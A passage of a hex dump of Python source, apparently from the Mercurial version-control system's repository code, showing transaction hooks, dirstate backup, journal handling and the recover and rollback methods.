+00017690: 636c 6f73 652d 686f 6f6b 272c 2074 786e  close-hook', txn
+000176a0: 636c 6f73 6568 6f6f 6b29 0a20 2020 2020  closehook).     
+000176b0: 2020 2023 2049 6e63 6c75 6465 2061 206c     # Include a l
+000176c0: 6561 6469 6e67 2022 2d22 2074 6f20 6d61  eading "-" to ma
+000176d0: 6b65 2069 7420 6861 7070 656e 2062 6566  ke it happen bef
+000176e0: 6f72 6520 7468 6520 7472 616e 7361 6374  ore the transact
+000176f0: 696f 6e20 7375 6d6d 6172 790a 2020 2020  ion summary.    
+00017700: 2020 2020 2320 7265 706f 7274 7320 7265      # reports re
+00017710: 6769 7374 6572 6564 2076 6961 2073 636d  gistered via scm
+00017720: 7574 696c 2e72 6567 6973 7465 7273 756d  util.registersum
+00017730: 6d61 7279 6361 6c6c 6261 636b 2829 2077  marycallback() w
+00017740: 686f 7365 206e 616d 6573 0a20 2020 2020  hose names.     
+00017750: 2020 2023 2061 7265 2030 302d 7478 6e72     # are 00-txnr
+00017760: 6570 6f72 7420 6574 632e 2054 6861 7420  eport etc. That 
+00017770: 7761 792c 2074 6865 2063 6163 6865 7320  way, the caches 
+00017780: 7769 6c6c 2062 6520 7761 726d 2077 6865  will be warm whe
+00017790: 6e20 7468 650a 2020 2020 2020 2020 2320  n the.        # 
+000177a0: 6361 6c6c 6261 636b 7320 7275 6e2e 0a20  callbacks run.. 
+000177b0: 2020 2020 2020 2074 722e 6164 6470 6f73         tr.addpos
+000177c0: 7463 6c6f 7365 2862 272d 7761 726d 2d63  tclose(b'-warm-c
+000177d0: 6163 6865 272c 2073 656c 662e 5f62 7569  ache', self._bui
+000177e0: 6c64 6361 6368 6575 7064 6174 6572 2874  ldcacheupdater(t
+000177f0: 7229 290a 0a20 2020 2020 2020 2064 6566  r))..        def
+00017800: 2074 786e 6162 6f72 7468 6f6f 6b28 7472   txnaborthook(tr
+00017810: 3229 3a0a 2020 2020 2020 2020 2020 2020  2):.            
+00017820: 2222 2254 6f20 6265 2072 756e 2069 6620  """To be run if 
+00017830: 7472 616e 7361 6374 696f 6e20 6973 2061  transaction is a
+00017840: 626f 7274 6564 2222 220a 2020 2020 2020  borted""".      
+00017850: 2020 2020 2020 7265 706f 203d 2072 6570        repo = rep
+00017860: 6f72 6566 2829 0a20 2020 2020 2020 2020  oref().         
+00017870: 2020 2061 7373 6572 7420 7265 706f 2069     assert repo i
+00017880: 7320 6e6f 7420 4e6f 6e65 2020 2320 6865  s not None  # he
+00017890: 6c70 2070 7974 7970 650a 2020 2020 2020  lp pytype.      
+000178a0: 2020 2020 2020 7265 706f 2e68 6f6f 6b28        repo.hook(
+000178b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000178c0: 2062 2774 786e 6162 6f72 7427 2c20 7468   b'txnabort', th
+000178d0: 726f 773d 4661 6c73 652c 202a 2a70 7963  row=False, **pyc
+000178e0: 6f6d 7061 742e 7374 726b 7761 7267 7328  ompat.strkwargs(
+000178f0: 7472 322e 686f 6f6b 6172 6773 290a 2020  tr2.hookargs).  
+00017900: 2020 2020 2020 2020 2020 290a 0a20 2020            )..   
+00017910: 2020 2020 2074 722e 6164 6461 626f 7274       tr.addabort
+00017920: 2862 2774 786e 6162 6f72 742d 686f 6f6b  (b'txnabort-hook
+00017930: 272c 2074 786e 6162 6f72 7468 6f6f 6b29  ', txnaborthook)
+00017940: 0a20 2020 2020 2020 2023 2061 766f 6964  .        # avoid
+00017950: 2065 6167 6572 2063 6163 6865 2069 6e76   eager cache inv
+00017960: 616c 6964 6174 696f 6e2e 2069 6e2d 6d65  alidation. in-me
+00017970: 6d6f 7279 2064 6174 6120 7368 6f75 6c64  mory data should
+00017980: 2062 6520 6964 656e 7469 6361 6c0a 2020   be identical.  
+00017990: 2020 2020 2020 2320 746f 2073 746f 7265        # to store
+000179a0: 6420 6461 7461 2069 6620 7472 616e 7361  d data if transa
+000179b0: 6374 696f 6e20 6861 7320 6e6f 2065 7272  ction has no err
+000179c0: 6f72 2e0a 2020 2020 2020 2020 7472 2e61  or..        tr.a
+000179d0: 6464 706f 7374 636c 6f73 6528 6227 7265  ddpostclose(b're
+000179e0: 6672 6573 682d 6669 6c65 6361 6368 6573  fresh-filecaches
+000179f0: 7461 7473 272c 2073 656c 662e 5f72 6566  tats', self._ref
+00017a00: 7265 7368 6669 6c65 6361 6368 6573 7461  reshfilecachesta
+00017a10: 7473 290a 2020 2020 2020 2020 7365 6c66  ts).        self
+00017a20: 2e5f 7472 616e 7372 6566 203d 2077 6561  ._transref = wea
+00017a30: 6b72 6566 2e72 6566 2874 7229 0a20 2020  kref.ref(tr).   
+00017a40: 2020 2020 2073 636d 7574 696c 2e72 6567       scmutil.reg
+00017a50: 6973 7465 7273 756d 6d61 7279 6361 6c6c  istersummarycall
+00017a60: 6261 636b 2873 656c 662c 2074 722c 2064  back(self, tr, d
+00017a70: 6573 6329 0a20 2020 2020 2020 2023 2054  esc).        # T
+00017a80: 6869 7320 6f6e 6c79 2065 7869 7374 2074  his only exist t
+00017a90: 6f20 6465 616c 2077 6974 6820 7468 6520  o deal with the 
+00017aa0: 6e65 6564 206f 6620 726f 6c6c 6261 636b  need of rollback
+00017ab0: 2074 6f20 6861 7665 2076 6961 626c 650a   to have viable.
+00017ac0: 2020 2020 2020 2020 2320 7061 7265 6e74          # parent
+00017ad0: 7320 6174 2074 6865 2065 6e64 206f 6620  s at the end of 
+00017ae0: 7468 6520 6f70 6572 6174 696f 6e2e 2053  the operation. S
+00017af0: 6f20 6261 636b 7570 2076 6961 626c 6520  o backup viable 
+00017b00: 7061 7265 6e74 7320 6174 2074 6865 0a20  parents at the. 
+00017b10: 2020 2020 2020 2023 2074 696d 6520 6f66         # time of
+00017b20: 2074 6869 7320 6f70 6572 6174 696f 6e2e   this operation.
+00017b30: 0a20 2020 2020 2020 2023 0a20 2020 2020  .        #.     
+00017b40: 2020 2023 2057 6520 6f6e 6c79 2064 6f20     # We only do 
+00017b50: 6974 2077 6865 6e20 7468 6520 6077 6c6f  it when the `wlo
+00017b60: 636b 6020 6973 2074 616b 656e 2c20 6f74  ck` is taken, ot
+00017b70: 6865 7277 6973 6520 6f74 6865 7220 6d69  herwise other mi
+00017b80: 6768 7420 6265 0a20 2020 2020 2020 2023  ght be.        #
+00017b90: 2061 6c74 6572 696e 6720 7468 6520 6469   altering the di
+00017ba0: 7273 7461 7465 2075 6e64 6572 2075 732e  rstate under us.
+00017bb0: 0a20 2020 2020 2020 2023 0a20 2020 2020  .        #.     
+00017bc0: 2020 2023 2054 6869 7320 6973 2072 6561     # This is rea
+00017bd0: 6c6c 7920 6e6f 7420 6120 6772 6561 7420  lly not a great 
+00017be0: 7761 7920 746f 2064 6f20 7468 6973 2028  way to do this (
+00017bf0: 6669 7273 742c 2062 6563 6175 7365 2077  first, because w
+00017c00: 6520 6361 6e6e 6f74 0a20 2020 2020 2020  e cannot.       
+00017c10: 2023 2061 6c77 6179 7320 646f 2069 7429   # always do it)
+00017c20: 2e20 5468 6572 6520 6172 6520 6d6f 7265  . There are more
+00017c30: 2076 6961 626c 6520 616c 7465 726e 6174   viable alternat
+00017c40: 6976 6520 7468 6174 2065 7869 7374 730a  ive that exists.
+00017c50: 2020 2020 2020 2020 230a 2020 2020 2020          #.      
+00017c60: 2020 2320 2d20 6261 636b 696e 6720 6f6e    # - backing on
+00017c70: 6c79 2074 6865 2077 6f72 6b69 6e67 2063  ly the working c
+00017c80: 6f70 7920 7061 7265 6e74 2069 6e20 6120  opy parent in a 
+00017c90: 6465 6469 6361 7465 6420 6669 6c65 7320  dedicated files 
+00017ca0: 616e 6420 646f 696e 670a 2020 2020 2020  and doing.      
+00017cb0: 2020 2320 2020 6120 636c 6561 6e20 226b    #   a clean "k
+00017cc0: 6565 702d 7570 6461 7465 2220 746f 2074  eep-update" to t
+00017cd0: 6865 6d20 6f6e 2060 6867 2072 6f6c 6c62  hem on `hg rollb
+00017ce0: 6163 6b60 2e0a 2020 2020 2020 2020 230a  ack`..        #.
+00017cf0: 2020 2020 2020 2020 2320 2d20 736c 6967          # - slig
+00017d00: 6874 6c79 2063 6861 6e67 696e 6720 7468  htly changing th
+00017d10: 6520 6265 6861 7669 6f72 2061 6e20 6170  e behavior an ap
+00017d20: 706c 7969 6e67 2061 206c 6f67 6963 2073  plying a logic s
+00017d30: 696d 696c 6172 2074 6f20 2268 670a 2020  imilar to "hg.  
+00017d40: 2020 2020 2020 2320 7374 7269 7022 2074        # strip" t
+00017d50: 6f20 7069 636b 2061 2077 6f72 6b69 6e67  o pick a working
+00017d60: 2063 6f70 7920 6465 7374 696e 6174 696f   copy destinatio
+00017d70: 6e20 6f6e 2060 6867 2072 6f6c 6c62 6163  n on `hg rollbac
+00017d80: 6b60 0a20 2020 2020 2020 2069 6620 7365  k`.        if se
+00017d90: 6c66 2e63 7572 7265 6e74 776c 6f63 6b28  lf.currentwlock(
+00017da0: 2920 6973 206e 6f74 204e 6f6e 653a 0a20  ) is not None:. 
+00017db0: 2020 2020 2020 2020 2020 2064 7320 3d20             ds = 
+00017dc0: 7365 6c66 2e64 6972 7374 6174 650a 2020  self.dirstate.  
+00017dd0: 2020 2020 2020 2020 2020 6966 206e 6f74            if not
+00017de0: 2073 656c 662e 7666 732e 6578 6973 7473   self.vfs.exists
+00017df0: 2862 2762 7261 6e63 6827 293a 0a20 2020  (b'branch'):.   
+00017e00: 2020 2020 2020 2020 2020 2020 2023 2066               # f
+00017e10: 6f72 6365 2061 2066 696c 6520 746f 2062  orce a file to b
+00017e20: 6520 7772 6974 7465 6e20 6966 204e 6f6e  e written if Non
+00017e30: 6520 6578 6973 740a 2020 2020 2020 2020  e exist.        
+00017e40: 2020 2020 2020 2020 6473 2e73 6574 6272          ds.setbr
+00017e50: 616e 6368 2862 2764 6566 6175 6c74 272c  anch(b'default',
+00017e60: 204e 6f6e 6529 0a0a 2020 2020 2020 2020   None)..        
+00017e70: 2020 2020 6465 6620 6261 636b 7570 5f64      def backup_d
+00017e80: 6972 7374 6174 6528 7472 293a 0a20 2020  irstate(tr):.   
+00017e90: 2020 2020 2020 2020 2020 2020 2066 6f72               for
+00017ea0: 2066 2069 6e20 6473 2e61 6c6c 5f66 696c   f in ds.all_fil
+00017eb0: 655f 6e61 6d65 7328 293a 0a20 2020 2020  e_names():.     
+00017ec0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00017ed0: 2068 6172 646c 696e 6b20 6261 636b 7570   hardlink backup
+00017ee0: 2069 7320 6f6b 6179 2062 6563 6175 7365   is okay because
+00017ef0: 2060 6469 7273 7461 7465 6020 6973 2061   `dirstate` is a
+00017f00: 6c77 6179 730a 2020 2020 2020 2020 2020  lways.          
+00017f10: 2020 2020 2020 2020 2020 2320 6174 6f6d            # atom
+00017f20: 6963 616c 6c79 2077 7269 7474 656e 2061  ically written a
+00017f30: 6e64 2070 6f73 7369 626c 6520 6461 7461  nd possible data
+00017f40: 2066 696c 6520 6172 6520 6170 7065 6e64   file are append
+00017f50: 206f 6e6c 790a 2020 2020 2020 2020 2020   only.          
+00017f60: 2020 2020 2020 2020 2020 2320 616e 6420            # and 
+00017f70: 7265 7369 7374 616e 7420 746f 2074 7261  resistant to tra
+00017f80: 696c 696e 6720 6461 7461 2e0a 2020 2020  iling data..    
+00017f90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017fa0: 7472 2e61 6464 6261 636b 7570 2866 2c20  tr.addbackup(f, 
+00017fb0: 6861 7264 6c69 6e6b 3d54 7275 652c 206c  hardlink=True, l
+00017fc0: 6f63 6174 696f 6e3d 6227 706c 6169 6e27  ocation=b'plain'
+00017fd0: 290a 0a20 2020 2020 2020 2020 2020 2074  )..            t
+00017fe0: 722e 6164 6476 616c 6964 6174 6f72 2862  r.addvalidator(b
+00017ff0: 2764 6972 7374 6174 652d 6261 636b 7570  'dirstate-backup
+00018000: 272c 2062 6163 6b75 705f 6469 7273 7461  ', backup_dirsta
+00018010: 7465 290a 2020 2020 2020 2020 7265 7475  te).        retu
+00018020: 726e 2074 720a 0a20 2020 2064 6566 205f  rn tr..    def _
+00018030: 6a6f 7572 6e61 6c66 696c 6573 2873 656c  journalfiles(sel
+00018040: 6629 3a0a 2020 2020 2020 2020 7265 7475  f):.        retu
+00018050: 726e 2028 0a20 2020 2020 2020 2020 2020  rn (.           
+00018060: 2028 7365 6c66 2e73 7666 732c 2062 276a   (self.svfs, b'j
+00018070: 6f75 726e 616c 2729 2c0a 2020 2020 2020  ournal'),.      
+00018080: 2020 2020 2020 2873 656c 662e 7666 732c        (self.vfs,
+00018090: 2062 276a 6f75 726e 616c 2e64 6573 6327   b'journal.desc'
+000180a0: 292c 0a20 2020 2020 2020 2029 0a0a 2020  ),.        )..  
+000180b0: 2020 6465 6620 756e 646f 6669 6c65 7328    def undofiles(
+000180c0: 7365 6c66 293a 0a20 2020 2020 2020 2072  self):.        r
+000180d0: 6574 7572 6e20 5b28 7666 732c 2075 6e64  eturn [(vfs, und
+000180e0: 6f6e 616d 6528 7829 2920 666f 7220 7666  oname(x)) for vf
+000180f0: 732c 2078 2069 6e20 7365 6c66 2e5f 6a6f  s, x in self._jo
+00018100: 7572 6e61 6c66 696c 6573 2829 5d0a 0a20  urnalfiles()].. 
+00018110: 2020 2040 756e 6669 6c74 6572 6564 6d65     @unfilteredme
+00018120: 7468 6f64 0a20 2020 2064 6566 205f 7772  thod.    def _wr
+00018130: 6974 656a 6f75 726e 616c 2873 656c 662c  itejournal(self,
+00018140: 2064 6573 6329 3a0a 2020 2020 2020 2020   desc):.        
+00018150: 7365 6c66 2e76 6673 2e77 7269 7465 2862  self.vfs.write(b
+00018160: 226a 6f75 726e 616c 2e64 6573 6322 2c20  "journal.desc", 
+00018170: 6222 2564 5c6e 2573 5c6e 2220 2520 286c  b"%d\n%s\n" % (l
+00018180: 656e 2873 656c 6629 2c20 6465 7363 2929  en(self), desc))
+00018190: 0a0a 2020 2020 6465 6620 7265 636f 7665  ..    def recove
+000181a0: 7228 7365 6c66 293a 0a20 2020 2020 2020  r(self):.       
+000181b0: 2077 6974 6820 7365 6c66 2e6c 6f63 6b28   with self.lock(
+000181c0: 293a 0a20 2020 2020 2020 2020 2020 2069  ):.            i
+000181d0: 6620 7365 6c66 2e73 7666 732e 6578 6973  f self.svfs.exis
+000181e0: 7473 2862 226a 6f75 726e 616c 2229 3a0a  ts(b"journal"):.
+000181f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00018200: 7365 6c66 2e75 692e 7374 6174 7573 285f  self.ui.status(_
+00018210: 2862 2272 6f6c 6c69 6e67 2062 6163 6b20  (b"rolling back 
+00018220: 696e 7465 7272 7570 7465 6420 7472 616e  interrupted tran
+00018230: 7361 6374 696f 6e5c 6e22 2929 0a20 2020  saction\n")).   
+00018240: 2020 2020 2020 2020 2020 2020 2076 6673               vfs
+00018250: 6d61 7020 3d20 7b0a 2020 2020 2020 2020  map = {.        
+00018260: 2020 2020 2020 2020 2020 2020 6227 273a              b'':
+00018270: 2073 656c 662e 7376 6673 2c0a 2020 2020   self.svfs,.    
+00018280: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00018290: 6227 706c 6169 6e27 3a20 7365 6c66 2e76  b'plain': self.v
+000182a0: 6673 2c0a 2020 2020 2020 2020 2020 2020  fs,.            
+000182b0: 2020 2020 7d0a 2020 2020 2020 2020 2020      }.          
+000182c0: 2020 2020 2020 7472 616e 7361 6374 696f        transactio
+000182d0: 6e2e 726f 6c6c 6261 636b 280a 2020 2020  n.rollback(.    
+000182e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000182f0: 7365 6c66 2e73 7666 732c 0a20 2020 2020  self.svfs,.     
+00018300: 2020 2020 2020 2020 2020 2020 2020 2076                 v
+00018310: 6673 6d61 702c 0a20 2020 2020 2020 2020  fsmap,.         
+00018320: 2020 2020 2020 2020 2020 2062 226a 6f75             b"jou
+00018330: 726e 616c 222c 0a20 2020 2020 2020 2020  rnal",.         
+00018340: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00018350: 7569 2e77 6172 6e2c 0a20 2020 2020 2020  ui.warn,.       
+00018360: 2020 2020 2020 2020 2020 2020 2063 6865               che
+00018370: 636b 616d 6269 6766 696c 6573 3d5f 6361  ckambigfiles=_ca
+00018380: 6368 6564 6669 6c65 732c 0a20 2020 2020  chedfiles,.     
+00018390: 2020 2020 2020 2020 2020 2029 0a20 2020             ).   
+000183a0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+000183b0: 662e 696e 7661 6c69 6461 7465 2829 0a20  f.invalidate(). 
+000183c0: 2020 2020 2020 2020 2020 2020 2020 2072                 r
+000183d0: 6574 7572 6e20 5472 7565 0a20 2020 2020  eturn True.     
+000183e0: 2020 2020 2020 2065 6c73 653a 0a20 2020         else:.   
+000183f0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+00018400: 662e 7569 2e77 6172 6e28 5f28 6222 6e6f  f.ui.warn(_(b"no
+00018410: 2069 6e74 6572 7275 7074 6564 2074 7261   interrupted tra
+00018420: 6e73 6163 7469 6f6e 2061 7661 696c 6162  nsaction availab
+00018430: 6c65 5c6e 2229 290a 2020 2020 2020 2020  le\n")).        
+00018440: 2020 2020 2020 2020 7265 7475 726e 2046          return F
+00018450: 616c 7365 0a0a 2020 2020 6465 6620 726f  alse..    def ro
+00018460: 6c6c 6261 636b 2873 656c 662c 2064 7279  llback(self, dry
+00018470: 7275 6e3d 4661 6c73 652c 2066 6f72 6365  run=False, force
+00018480: 3d46 616c 7365 293a 0a20 2020 2020 2020  =False):.       
+00018490: 2077 6c6f 636b 203d 206c 6f63 6b20 3d20   wlock = lock = 
+000184a0: 4e6f 6e65 0a20 2020 2020 2020 2074 7279  None.        try
+000184b0: 3a0a 2020 2020 2020 2020 2020 2020 776c  :.            wl
+000184c0: 6f63 6b20 3d20 7365 6c66 2e77 6c6f 636b  ock = self.wlock
+000184d0: 2829 0a20 2020 2020 2020 2020 2020 206c  ().            l
+000184e0: 6f63 6b20 3d20 7365 6c66 2e6c 6f63 6b28  ock = self.lock(
+000184f0: 290a 2020 2020 2020 2020 2020 2020 6966  ).            if
+00018500: 2073 656c 662e 7376 6673 2e65 7869 7374   self.svfs.exist
+00018510: 7328 6222 756e 646f 2229 3a0a 2020 2020  s(b"undo"):.    
+00018520: 2020 2020 2020 2020 2020 2020 7265 7475              retu
+00018530: 726e 2073 656c 662e 5f72 6f6c 6c62 6163  rn self._rollbac
+00018540: 6b28 6472 7972 756e 2c20 666f 7263 6529  k(dryrun, force)
+00018550: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
+00018560: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
+00018570: 2020 2073 656c 662e 7569 2e77 6172 6e28     self.ui.warn(
+00018580: 5f28 6222 6e6f 2072 6f6c 6c62 6163 6b20  _(b"no rollback 
+00018590: 696e 666f 726d 6174 696f 6e20 6176 6169  information avai
+000185a0: 6c61 626c 655c 6e22 2929 0a20 2020 2020  lable\n")).     
+000185b0: 2020 2020 2020 2020 2020 2072 6574 7572             retur
+000185c0: 6e20 310a 2020 2020 2020 2020 6669 6e61  n 1.        fina
+000185d0: 6c6c 793a 0a20 2020 2020 2020 2020 2020  lly:.           
+000185e0: 2072 656c 6561 7365 286c 6f63 6b2c 2077   release(lock, w
+000185f0: 6c6f 636b 290a 0a20 2020 2040 756e 6669  lock)..    @unfi
+00018600: 6c74 6572 6564 6d65 7468 6f64 2020 2320  lteredmethod  # 
+00018610: 556e 7469 6c20 7765 2067 6574 2073 6d61  Until we get sma
+00018620: 7274 6572 2063 6163 6865 206d 616e 6167  rter cache manag
+00018630: 656d 656e 740a 2020 2020 6465 6620 5f72  ement.    def _r
+00018640: 6f6c 6c62 6163 6b28 7365 6c66 2c20 6472  ollback(self, dr
+00018650: 7972 756e 2c20 666f 7263 6529 3a0a 2020  yrun, force):.  
+00018660: 2020 2020 2020 7569 203d 2073 656c 662e        ui = self.
+00018670: 7569 0a0a 2020 2020 2020 2020 7061 7265  ui..        pare
+00018680: 6e74 7320 3d20 7365 6c66 2e64 6972 7374  nts = self.dirst
+00018690: 6174 652e 7061 7265 6e74 7328 290a 2020  ate.parents().  
+000186a0: 2020 2020 2020 7472 793a 0a20 2020 2020        try:.     
+000186b0: 2020 2020 2020 2061 7267 7320 3d20 7365         args = se
+000186c0: 6c66 2e76 6673 2e72 6561 6428 6227 756e  lf.vfs.read(b'un
+000186d0: 646f 2e64 6573 6327 292e 7370 6c69 746c  do.desc').splitl
+000186e0: 696e 6573 2829 0a20 2020 2020 2020 2020  ines().         
+000186f0: 2020 2028 6f6c 646c 656e 2c20 6465 7363     (oldlen, desc
+00018700: 2c20 6465 7461 696c 2920 3d20 2869 6e74  , detail) = (int
+00018710: 2861 7267 735b 305d 292c 2061 7267 735b  (args[0]), args[
+00018720: 315d 2c20 4e6f 6e65 290a 2020 2020 2020  1], None).      
+00018730: 2020 2020 2020 6966 206c 656e 2861 7267        if len(arg
+00018740: 7329 203e 3d20 333a 0a20 2020 2020 2020  s) >= 3:.       
+00018750: 2020 2020 2020 2020 2064 6574 6169 6c20           detail 
+00018760: 3d20 6172 6773 5b32 5d0a 2020 2020 2020  = args[2].      
+00018770: 2020 2020 2020 6f6c 6474 6970 203d 206f        oldtip = o
+00018780: 6c64 6c65 6e20 2d20 310a 0a20 2020 2020  ldlen - 1..     
+00018790: 2020 2020 2020 2069 6620 6465 7461 696c         if detail
+000187a0: 2061 6e64 2075 692e 7665 7262 6f73 653a   and ui.verbose:
+000187b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000187c0: 206d 7367 203d 205f 280a 2020 2020 2020   msg = _(.      
+000187d0: 2020 2020 2020 2020 2020 2020 2020 6227                b'
+000187e0: 7265 706f 7369 746f 7279 2074 6970 2072  repository tip r
+000187f0: 6f6c 6c65 6420 6261 636b 2074 6f20 7265  olled back to re
+00018800: 7669 7369 6f6e 2025 6427 0a20 2020 2020  vision %d'.     
+00018810: 2020 2020 2020 2020 2020 2020 2020 2062                 b
+00018820: 2720 2875 6e64 6f20 2573 3a20 2573 295c  ' (undo %s: %s)\
+00018830: 6e27 0a20 2020 2020 2020 2020 2020 2020  n'.             
+00018840: 2020 2029 2025 2028 6f6c 6474 6970 2c20     ) % (oldtip, 
+00018850: 6465 7363 2c20 6465 7461 696c 290a 2020  desc, detail).  
+00018860: 2020 2020 2020 2020 2020 656c 7365 3a0a            else:.
+00018870: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00018880: 6d73 6720 3d20 5f28 0a20 2020 2020 2020  msg = _(.       
+00018890: 2020 2020 2020 2020 2020 2020 2062 2772               b'r
+000188a0: 6570 6f73 6974 6f72 7920 7469 7020 726f  epository tip ro
+000188b0: 6c6c 6564 2062 6163 6b20 746f 2072 6576  lled back to rev
+000188c0: 6973 696f 6e20 2564 2028 756e 646f 2025  ision %d (undo %
+000188d0: 7329 5c6e 270a 2020 2020 2020 2020 2020  s)\n'.          
+000188e0: 2020 2020 2020 2920 2520 286f 6c64 7469        ) % (oldti
+000188f0: 702c 2064 6573 6329 0a20 2020 2020 2020  p, desc).       
+00018900: 2020 2020 2070 6172 656e 7467 6f6e 6520       parentgone 
+00018910: 3d20 616e 7928 7365 6c66 5b70 5d2e 7265  = any(self[p].re
+00018920: 7628 2920 3e20 6f6c 6474 6970 2066 6f72  v() > oldtip for
+00018930: 2070 2069 6e20 7061 7265 6e74 7329 0a20   p in parents). 
+00018940: 2020 2020 2020 2065 7863 6570 7420 494f         except IO
+00018950: 4572 726f 723a 0a20 2020 2020 2020 2020  Error:.         
+00018960: 2020 206d 7367 203d 205f 2862 2772 6f6c     msg = _(b'rol
+00018970: 6c69 6e67 2062 6163 6b20 756e 6b6e 6f77  ling back unknow
+00018980: 6e20 7472 616e 7361 6374 696f 6e5c 6e27  n transaction\n'
+00018990: 290a 2020 2020 2020 2020 2020 2020 6465  ).            de
+000189a0: 7363 203d 204e 6f6e 650a 2020 2020 2020  sc = None.      
+000189b0: 2020 2020 2020 7061 7265 6e74 676f 6e65        parentgone
+000189c0: 203d 2054 7275 650a 0a20 2020 2020 2020   = True..       
+000189d0: 2069 6620 6e6f 7420 666f 7263 6520 616e   if not force an
+000189e0: 6420 7365 6c66 5b62 272e 275d 2021 3d20  d self[b'.'] != 
+000189f0: 7365 6c66 5b62 2774 6970 275d 2061 6e64  self[b'tip'] and
+00018a00: 2064 6573 6320 3d3d 2062 2763 6f6d 6d69   desc == b'commi
+00018a10: 7427 3a0a 2020 2020 2020 2020 2020 2020  t':.            
+00018a20: 7261 6973 6520 6572 726f 722e 4162 6f72  raise error.Abor
+00018a30: 7428 0a20 2020 2020 2020 2020 2020 2020  t(.             
+00018a40: 2020 205f 280a 2020 2020 2020 2020 2020     _(.          
+00018a50: 2020 2020 2020 2020 2020 6227 726f 6c6c            b'roll
+00018a60: 6261 636b 206f 6620 6c61 7374 2063 6f6d  back of last com
+00018a70: 6d69 7420 7768 696c 6520 6e6f 7420 6368  mit while not ch
+00018a80: 6563 6b65 6420 6f75 7420 270a 2020 2020  ecked out '.    
+00018a90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00018aa0: 6227 6d61 7920 6c6f 7365 2064 6174 6127  b'may lose data'
+00018ab0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00018ac0: 2029 2c0a 2020 2020 2020 2020 2020 2020   ),.            
+00018ad0: 2020 2020 6869 6e74 3d5f 2862 2775 7365      hint=_(b'use
+00018ae0: 202d 6620 746f 2066 6f72 6365 2729 2c0a   -f to force'),.
+00018af0: 2020 2020 2020 2020 2020 2020 290a 0a20              ).. 
+00018b00: 2020 2020 2020 2075 692e 7374 6174 7573         ui.status
+00018b10: 286d 7367 290a 2020 2020 2020 2020 6966  (msg).        if
+00018b20: 2064 7279 7275 6e3a 0a20 2020 2020 2020   dryrun:.       
+00018b30: 2020 2020 2072 6574 7572 6e20 300a 0a20       return 0.. 
+00018b40: 2020 2020 2020 2073 656c 662e 6465 7374         self.dest
+00018b50: 726f 7969 6e67 2829 0a20 2020 2020 2020  roying().       
+00018b60: 2076 6673 6d61 7020 3d20 7b62 2770 6c61   vfsmap = {b'pla
+00018b70: 696e 273a 2073 656c 662e 7666 732c 2062  in': self.vfs, b
+00018b80: 2727 3a20 7365 6c66 2e73 7666 737d 0a20  '': self.svfs}. 
+00018b90: 2020 2020 2020 2073 6b69 705f 6a6f 7572         skip_jour
+00018ba0: 6e61 6c5f 7061 7474 6572 6e20 3d20 4e6f  nal_pattern = No
+00018bb0: 6e65 0a20 2020 2020 2020 2069 6620 6e6f  ne.        if no
+00018bc0: 7420 7061 7265 6e74 676f 6e65 3a0a 2020  t parentgone:.  
+00018bd0: 2020 2020 2020 2020 2020 736b 6970 5f6a            skip_j
+00018be0: 6f75 726e 616c 5f70 6174 7465 726e 203d  ournal_pattern =
+00018bf0: 2052 455f 534b 4950 5f44 4952 5354 4154   RE_SKIP_DIRSTAT
+00018c00: 455f 524f 4c4c 4241 434b 0a20 2020 2020  E_ROLLBACK.     
+00018c10: 2020 2074 7261 6e73 6163 7469 6f6e 2e72     transaction.r
+00018c20: 6f6c 6c62 6163 6b28 0a20 2020 2020 2020  ollback(.       
+00018c30: 2020 2020 2073 656c 662e 7376 6673 2c0a       self.svfs,.
+00018c40: 2020 2020 2020 2020 2020 2020 7666 736d              vfsm
+00018c50: 6170 2c0a 2020 2020 2020 2020 2020 2020  ap,.            
+00018c60: 6227 756e 646f 272c 0a20 2020 2020 2020  b'undo',.       
+00018c70: 2020 2020 2075 692e 7761 726e 2c0a 2020       ui.warn,.  
+00018c80: 2020 2020 2020 2020 2020 6368 6563 6b61            checka
+00018c90: 6d62 6967 6669 6c65 733d 5f63 6163 6865  mbigfiles=_cache
+00018ca0: 6466 696c 6573 2c0a 2020 2020 2020 2020  dfiles,.        
+00018cb0: 2020 2020 736b 6970 5f6a 6f75 726e 616c      skip_journal
+00018cc0: 5f70 6174 7465 726e 3d73 6b69 705f 6a6f  _pattern=skip_jo
+00018cd0: 7572 6e61 6c5f 7061 7474 6572 6e2c 0a20  urnal_pattern,. 
+00018ce0: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
+00018cf0: 2073 656c 662e 696e 7661 6c69 6461 7465   self.invalidate
+00018d00: 2829 0a20 2020 2020 2020 2073 656c 662e  ().        self.
+00018d10: 6469 7273 7461 7465 2e69 6e76 616c 6964  dirstate.invalid
+00018d20: 6174 6528 290a 0a20 2020 2020 2020 2069  ate()..        i
+00018d30: 6620 7061 7265 6e74 676f 6e65 3a0a 2020  f parentgone:.  
+00018d40: 2020 2020 2020 2020 2020 2320 7265 706c            # repl
+00018d50: 6163 6520 7468 6973 2077 6974 6820 736f  ace this with so
+00018d60: 6d65 2065 7870 6c69 6369 7420 7061 7265  me explicit pare
+00018d70: 6e74 2075 7064 6174 6520 696e 2074 6865  nt update in the
+00018d80: 2066 7574 7572 652e 0a20 2020 2020 2020   future..       
+00018d90: 2020 2020 2068 6173 5f6e 6f64 6520 3d20       has_node = 
+00018da0: 7365 6c66 2e63 6861 6e67 656c 6f67 2e69  self.changelog.i
+00018db0: 6e64 6578 2e68 6173 5f6e 6f64 650a 2020  ndex.has_node.  
+00018dc0: 2020 2020 2020 2020 2020 6966 206e 6f74            if not
+00018dd0: 2061 6c6c 2868 6173 5f6e 6f64 6528 7029   all(has_node(p)
+00018de0: 2066 6f72 2070 2069 6e20 7365 6c66 2e64   for p in self.d
+00018df0: 6972 7374 6174 652e 5f70 6c29 3a0a 2020  irstate._pl):.  
+00018e00: 2020 2020 2020 2020 2020 2020 2020 2320                # 
